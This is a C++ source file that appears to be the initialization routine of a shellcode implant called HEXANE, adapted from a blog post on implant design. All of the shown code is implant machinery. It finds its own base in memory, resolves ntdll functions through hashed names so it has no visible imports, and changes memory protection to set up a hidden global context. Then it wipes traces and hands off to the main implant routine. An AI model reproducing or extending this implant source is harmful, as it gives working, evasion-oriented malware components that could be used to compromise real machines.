#include <core/include/context.hpp>
using namespace Memory;

VOID Main() {
    Core::MainRoutine();
}

VOID ContextInit () {
    // Courtesy of C5pider - https://5pider.net/blog/2024/01/27/modern-shellcode-implant-design/

    HEXANE_CTX Instance = { };
    LPVOID MmAddr       = 0;
    SIZE_T MmSize       = 0;
    ULONG Protect       = 0;

    Instance.Teb            = NtCurrentTeb();
    Instance.Heap           = Instance.Teb->ProcessEnvironmentBlock->ProcessHeap;

    Instance.Base.Address   = U_PTR(InstStart());
    Instance.Base.Size      = U_PTR(InstEnd()) - Instance.Base.Address;

    MmAddr = C_PTR(GLOBAL_OFFSET);
    MmSize = sizeof(MmAddr);

    if (
        !(Instance.Modules.ntdll = LdrGetModuleAddress(NTDLL)) ||
        !(FPTR(Instance.Nt.NtProtectVirtualMemory, Instance.Modules.ntdll, NTPROTECTVIRTUALMEMORY)) ||
        !(FPTR(Instance.Nt.RtlAllocateHeap, Instance.Modules.ntdll, RTLALLOCATEHEAP)) ||
        !(FPTR(Instance.Nt.RtlRandomEx, Instance.Modules.ntdll, RTLRANDOMEX))) {
        return;
    }
    if (!NT_SUCCESS(Instance.Nt.NtProtectVirtualMemory(NtCurrentProcess(), &MmAddr, &MmSize, PAGE_READWRITE, &Protect))) {
        return;
    }
    MmAddr = C_PTR(GLOBAL_OFFSET);
    if (!(C_DREF(MmAddr) = Instance.Nt.RtlAllocateHeap(Instance.Heap, HEAP_ZERO_MEMORY, sizeof(HEXANE_CTX)))) {
        return;
    }

    x_memcpy(C_DREF(MmAddr), &Instance, sizeof(HEXANE_CTX));
    x_memset(&Instance, 0, sizeof(HEXANE_CTX));
    x_memset(C_PTR(U_PTR(MmAddr) + sizeof(LPVOID)), 0, 0xE);

    Main();
}
